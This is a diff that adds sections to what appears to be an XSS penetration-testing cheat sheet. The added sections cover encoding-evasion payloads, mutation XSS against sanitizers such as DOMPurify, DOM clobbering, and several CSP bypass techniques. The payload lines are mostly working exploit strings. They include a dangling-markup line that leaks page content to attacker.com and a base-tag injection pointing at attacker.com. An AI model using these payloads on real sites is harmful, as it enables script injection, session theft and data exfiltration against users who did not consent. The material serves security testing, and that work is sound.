@@ -86,6 +86,8 @@ javascript:alert(document.domain)
 &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;  # HTML entity
 %3Cscript%3Ealert(1)%3C%2Fscript%3E              # URL encoding
 %253Cscript%253Ealert(1)%253C%252Fscript%253E     # Double URL encoding
+&#0000060script&#0000062alert(1)&#0000060/script&#0000062  # Decimal entity, no semicolon, leading zeros
++ADw-script+AD4-alert(1)+ADw-/script+AD4-          # UTF-7 (only if charset negotiable/missing meta charset)
 \u0061lert(1)                                      # Unicode escape (JS)
 ```
 
@@ -105,8 +107,34 @@ When a single global `replace` strips `<tag` + the following non-word run + one 
 ```
 The leading `<` is skipped (next char is `<`, not a word char), the `<a>i` / `<a>s` span is consumed, and nothing after it matches.
 
+### Mutation XSS (mXSS)
+Sanitizer parses input once, serializes, then the browser re-parses the serialized DOM differently — the payload "mutates" into something dangerous only after the sanitizer already approved it. Test against DOMPurify/innerHTML-based sanitizers:
+```html
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<svg><p><style><img src=1 onerror=alert(1)></style></p></svg>
+<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
+<form><math><mtext></form><form><mglyph><style></math><img src=1 onerror=alert(1)>
+```
+Confirm by round-tripping the payload through the target's actual sanitizer (client-side JS if accessible) rather than assuming — mXSS behavior is version/browser-parser dependent.
+
+### DOM Clobbering
+When a script reads a global/property before it's assigned (`var x = x || defaultConfig`, or references `document.getElementById('config')` result as if it were an object), named HTML elements can "clobber" that lookup:
+```html
+<a id=config></a>
+<a id=config name=innerHTML href="javascript:alert(1)"></a>
+<form id=x><input id=y name=z></form>  <!-- window.x.y / window.x.z resolve to elements -->
+```
+Useful for polluting `window.__proto__`-adjacent lookups or config objects into a state that flows into an existing `eval`/`innerHTML` sink elsewhere in the app.
+
 ### CSP Bypass Indicators
 Check header for: unsafe-inline, unsafe-eval, wildcard sources, JSONP endpoints, CDN with user content.
+
+### CSP Bypass Techniques
+- **JSONP/Angular callback abuse**: if an allowed `script-src` host serves a JSONP endpoint or hosts old AngularJS, load it and pivot: `<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>` or an AngularJS sandbox-escape payload (`{{constructor.constructor('alert(1)')()}}`) if `ng-app`/`ng-csp` scripts are on an allow-listed origin.
+- **Dangling markup injection** (when script execution is blocked but HTML injection isn't): exfiltrate data via an unterminated attribute that swallows subsequent markup into a request to an attacker origin: `<img src='https://attacker.com/leak?` — the browser keeps consuming markup as the `src` value until the next quote.
+- **strict-dynamic + nonce leak**: if a nonce is reused across responses or leaks into a reflected context (view-source, error page, cached response), replay it: `<script nonce="LEAKED_NONCE">alert(1)</script>`.
+- **base-uri missing**: if CSP lacks `base-uri 'self'` and allows `unsafe-inline` for some directive, inject `<base href="https://attacker.com/">` to hijack all relative script/resource paths.
+- **Trusted Types bypass**: if `require-trusted-types-for 'script'` is set but a default policy exists (`TrustedTypes.createPolicy('default', ...)`) with a permissive `createHTML`, feed the sink through the default policy instead of `innerHTML` directly.
 
 ### CSP Header Injection
 When a user-controlled value is interpolated into the emitted CSP directive (for example a profile-image URL concatenated into `img-src`), inject a second, permissive directive through the reflected value:
